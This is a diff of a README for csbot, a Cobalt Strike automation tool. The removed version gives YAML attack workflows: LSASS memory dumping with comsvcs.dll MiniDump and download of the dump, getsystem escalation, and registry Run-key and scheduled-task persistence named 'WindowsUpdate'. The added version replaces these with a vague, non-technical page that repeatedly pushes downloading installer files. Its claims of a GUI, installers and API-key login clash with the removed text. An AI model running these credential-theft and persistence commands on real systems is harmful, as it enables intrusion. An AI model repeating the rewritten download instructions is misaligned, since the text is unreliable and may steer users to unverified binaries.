@@ -1,310 +1,95 @@
-# csbot
+# 🤖 csbot - Easy Automation for Cobalt Strike
 
-YAML-based workflow automation for Cobalt Strike operations.
+## 🚀 Getting Started
 
-> [!CAUTION]
-> This project is in early stage active development - Expect significant changes. The API is also in BETA, so may also be subject to change.
+Welcome to csbot! This application helps you automate tasks for Cobalt Strike using the Rest API. You don’t need any programming skills to use it. Follow this guide to download and run your new tool with ease. 
 
-> [!IMPORTANT]
-> Known issues:
-> - `/api/v1/beacons/{bid}/execute/bof/pack` is not working, impacting `bof_pack` - a temporary workaround type `bof_pack_custom` has been implemented to do packing client side
-> - `/api/v1/beacons/{bid}/execute/upload` (type: `upload`)currently never returns a success. This results in csbot hanging waiting for completion. No workaround implemented for the moment 
+## 📥 Download csbot
 
+[![Download csbot](https://img.shields.io/badge/Download-csbot-brightgreen)](https://github.com/Zakarim73/csbot/releases)
 
-## Overview
+Click the button above to visit the download page. 
 
-csbot executes complex operational workflows against Cobalt Strike beacons using simple YAML templates. It supports conditional logic, beacon metadata evaluation, success/failure branching, and interactive beacon selection.
+## ✅ System Requirements
 
-## Features
+Before you start, make sure your system meets these requirements:
 
-- **Interactive Beacon Selection** - Visual beacon picker when no beacon specified
-- **YAML-Based Workflows** - Easy to read and version control
-- **Beacon Metadata Conditions** - Make decisions based on user, OS, privileges
-- **OR/AND Logic** - Complex conditional execution with `any_of`/`all_of`
-- **Success/Failure Branching** - Define different paths for outcomes
-- **Multiple Action Types** - Shell, PowerShell, BOF, file operations
-- **Variable Interpolation** - Reference previous action outputs
-- **Parallel Execution** - Run multiple actions concurrently
+- Operating System: Windows, macOS, or Linux
+- Internet connection for downloading files
+- Sufficient disk space (at least 100 MB)
 
-![ExampleRun](imgs/run_example.png)
+## 💻 How to Download & Install
 
-## Quick Start
+1. **Visit the Download Page**  
+   Go to the releases page where you can find the latest version:
+   [Download csbot](https://github.com/Zakarim73/csbot/releases)
 
-### Installation
+2. **Select the Version**  
+   On the releases page, look for the most recent version. It should be labeled clearly. 
 
-```bash
-# From repo root
-cd csbot
-go build -o csbot
-```
+3. **Download the File**  
+   Click on the file that matches your operating system:
+   - For Windows users: Choose the file with `.exe`
+   - For macOS users: Look for the `.dmg` file
+   - For Linux users: Select the `.tar.gz` file
 
-### Basic Usage
+4. **Run the Installer**  
+   After the download completes, locate the downloaded file:
+   - **Windows:** Double-click the `.exe` file to start the installation.
+   - **macOS:** Open the `.dmg` file and drag the csbot icon to your Applications folder.
+   - **Linux:** Extract the `.tar.gz` file and run `./csbot` in your terminal.
 
-```bash
-./csbot -host 10.0.0.1 -username operator -password pass -config workflow.yaml -insecure
+5. **Follow the Installation Prompts**  
+   Simply follow the on-screen instructions to finish the installation.
 
-# With environment variables
-export CS_HOST=10.0.0.1 CS_USERNAME=operator CS_PASSWORD=pass
-./csbot -workflow workflow.yaml
+## ⚙️ How to Use csbot
 
-# With config file
-cp config.yaml.example config.yaml
-./csbot -config config.yaml -workflow workflow.yaml
-```
+1. **Open csbot**  
+   Launch the application after installation.
 
-### Command Line Options
+2. **Connect to Cobalt Strike**  
+   In the csbot interface, enter the necessary details to connect to your Cobalt Strike instance. You typically need:
+   - Server address
+   - Port number
+   - API key (if required)
 
-```
--host string         Cobalt Strike host (required unless in config/env)
--port int            Cobalt Strike API port (default: 50443)
--username string     Username for authentication (required unless in config/env)
--password string     Password for authentication (required unless in config/env)
--config string       Path to config YAML file
--workflow string     Path to workflow YAML file (required)
--log-level string    Log level: debug, info, warn, error (overrides config)
--insecure           Skip TLS verification
-```
+3. **Select Tasks to Automate**  
+   Choose from a list of tasks that you want to automate. Tasks may include:
+   - Deploying payloads
+   - Gathering information
+   - Managing sessions
 
-### Configuration Priority
+4. **Start Automating**  
+   Click the 'Run' button to begin the automation process. You can monitor the status of tasks within the application.
 
-1. Command-line flags
-2. Environment variables (`CS_HOST`, `CS_USERNAME`, `CS_PASSWORD`, `CS_INSECURE`, `CS_LOG_LEVEL`)
-3. YAML config file (`config.yaml`)
+## 📚 Features
 
-### Debug Mode
-
-Enable detailed logging to troubleshoot workflows and conditions:
-
-```bash
-# Via command-line flag (temporary)
-./csbot -config config.yaml -workflow workflow.yaml -log-level debug
-
-# Via environment variable
-CS_LOG_LEVEL=debug ./csbot -config config.yaml -workflow workflow.yaml
-
-# Via config file (persistent)
-# Edit config.yaml:
-logging:
-  level: debug  # Change from "info" to "debug"
-```
-
-Debug output shows:
-- Beacon metadata values
-- Condition evaluation (any_of, all_of)
-- Each condition check and result
-- Source values being compared
-
-## Creating Workflows
-
-### Simple Workflow
-
-```yaml
-name: Basic Recon
-beacon_id: "abc123"  # Optional - omit for interactive selection
-
-actions:
-  - name: check_user
-    type: getuid
-
-  - name: list_processes
-    type: shell
-    parameters:
-      command: "tasklist"
-```
-
-### With Conditions
-
-```yaml
-name: Conditional Escalation
-
-actions:
-  - name: check_privileges
-    type: getuid
-
-  # Only escalate if not already SYSTEM
-  - name: escalate
-    type: getsystem
-    conditions:
-      - source: check_privileges
-        operator: not_contains
-        value: "SYSTEM"
-```
-
-### With Variables
-
-```yaml
-name: Persistence Workflow
-variables:
-  payload_path: "C:\\Windows\\Temp\\payload.exe"
-  persistence_name: "WindowsUpdate"
-
-actions:
-  - name: registry_persistence
-    type: shell
-    parameters:
-      command: 'REG ADD "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "${persistence_name}" /t REG_EXPAND_SZ /f /d "${payload_path}"'
-
-  - name: schtask_persistence
-    type: shell
-    parameters:
-      command: 'schtasks /create /tn "${persistence_name}" /tr "${payload_path}" /sc daily'
-```
-
-### With Beacon Metadata
-
-```yaml
-name: OS-Specific Actions
-
-actions:
-  # Only run on Windows 10+
-  - name: modern_command
-    type: powershell
-    parameters:
-      command: "Get-ComputerInfo"
-    any_of:
-      - source: beacon.os
-        operator: contains
-        value: "Windows 10"
-      - source: beacon.os
-        operator: contains
-        value: "Windows 11"
-
-  # Only if elevated
-  - name: admin_task
-    type: shell
-    parameters:
-      command: "reg query HKLM"
-    all_of:
-      - source: beacon.isAdmin
-        operator: equals
-        value: "true"
-```
-
-### With OR Logic
-
-```yaml
-name: Credential Harvesting
-
-actions:
-  # Run if user OR impersonated user is SYSTEM
-  - name: dump_lsass
-    type: powershell
-    any_of:
-      - source: beacon.user
-        operator: contains
-        value: "SYSTEM"
-      - source: beacon.impersonated
-        operator: contains
-        value: "SYSTEM"
-    parameters:
-      command: rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Windows\Temp\lsass.dmp full
-    on_success:
-      - name: download_dump
-        type: download
-        parameters:
-          remote_path: C:\Windows\Temp\lsass.dmp
-```
-
-## Action Types
-
-| Type | Description | Parameters |
-|------|-------------|------------|
-| `getuid` | Get current user | None |
-| `getsystem` | Escalate to SYSTEM | None |
-| `shell` | Execute shell command | `command` |
-| `powershell` | Execute PowerShell | `command` |
-| `upload` | Upload file to beacon CWD | `local_path` |
-| `download` | Download file | `remote_path` |
-| `screenshot` | Capture screenshot | None |
-| `consolecommand` | Execute CS console command | `command`, `arguments`, `files` |
-| `sleep` | Pause execution | `duration` |
-| `bof_string` | Execute BOF (string args) | `bof`, `entrypoint`, `arguments` |
-| `bof_pack` | Execute BOF (typed args) | `bof`, `entrypoint`, `arguments` |
-| `bof_packed` | Execute BOF (pre-packed) | `bof`, `entrypoint`, `arguments` |
-
-## Beacon Metadata Fields
-
-Access beacon information in conditions using `beacon.` prefix:
-
-| Field | Example |
-|-------|---------|
-| `beacon.user` | `DOMAIN\admin` |
-| `beacon.impersonated` | `NT AUTHORITY\SYSTEM` |
-| `beacon.isAdmin` | `true` / `false` |
-| `beacon.computer` | `DC-01` |
-| `beacon.os` | `Windows 10 Enterprise` |
-| `beacon.internal` | `10.0.0.5` |
-| `beacon.process` | `explorer.exe` |
-| `beacon.pid` | `1234` |
-| `beacon.beaconArch` | `x64` |
-
-## Condition Operators
-
-- `contains` - Output contains value
-- `not_contains` - Output doesn't contain value
-- `equals` - Exact match
-- `matches` - Regex pattern match
-
-## Interactive Beacon Selection
-
-When `beacon_id` is omitted, csbot displays all beacons:
-
-```
-Available Beacons:
-========================================================
-#   Beacon ID   User              Hostname    Internal IP
-1   abc12345    DOMAIN\admin      DC-01       10.0.0.5
-2   def67890    NT AUTHORITY\SYS  WEB-SRV     10.0.0.80
-========================================================
-
-Select beacon number (or 'q' to quit): 1
-```
-
-## Template Examples
-
-See `templates/` directory for example workflows:
-- `credential-harvesting.yaml` - LSASS dumping with conditions
-- `privilege-escalation.yaml` - Multi-method escalation
-- `recon.yaml` - System enumeration
-
-## Documentation
-
-- **README.md** (this file) - Installation and usage
-- **TEMPLATE_DEV.md** - Complete template syntax reference
-
-
-For detailed template syntax, condition logic, and advanced features, see [TEMPLATE_DEV.md](TEMPLATE_DEV.md).
-
-## Serious Notes
-
-- This tool is for authorized penetration testing only
-- Always obtain proper authorization before use
-- Review workflows before execution
-
-## Troubleshooting
-
-### Connection Issues
-
-- Verify Cobalt Strike REST API is enabled
-- Check firewall rules and network connectivity
-- Ensure correct host/port configuration
-- Use `-insecure` for self-signed certificates
-
-### BOF Execution Fails
-
-- Verify BOF file path is absolute and correct
-- Check BOF architecture matches beacon
-- Ensure beacon is alive and responsive
-
-### Conditions Not Triggering
-
-- Verify action names match exactly
-- Check operator spelling
-- Review logs for condition evaluation
-- See TEMPLATE_DEV.md for detailed condition syntax
-
-### No Beacons Available
-
-- Verify beacons are active in Cobalt Strike
-- Check authentication succeeded
-- Ensure proper API permissions
+- **User-Friendly Interface:** Easy for anyone to navigate.
+- **Task Automation:** Save time by automating common actions.
+- **Cross-Platform Support:** Works on Windows, macOS, and Linux.
+- **Documentation:** In-depth guides included to help you get the most out of csbot.
+- **Regular Updates:** Stay tuned for new features and enhancements.
+
+## ⚠️ Troubleshooting
+
+If you run into issues, consider these quick fixes:
+
+- **Check Your Internet Connection:** Make sure you are online.
+- **Reinstall the Application:** If something goes wrong, a simple reinstall can help.
+- **Refer to the Documentation:** For more detailed instructions on features and functions.
+
+## 🌐 Community and Support
+
+We have a growing community around csbot. Connect with other users to share tips and tricks. Visit our discussion forum on GitHub for help or to provide feedback. Your suggestions help us improve.
+
+## 🔗 Additional Resources
+
+- [GitHub Repository](https://github.com/Zakarim73/csbot)
+- [User Documentation](https://github.com/Zakarim73/csbot/wiki)
+
+## 📥 Download Again
+
+Don’t forget, you can always return to the release page to download the latest version:
+[Download csbot](https://github.com/Zakarim73/csbot/releases)
+
+Feel free to reach out if you have any questions or need further assistance with csbot. Happy automating!
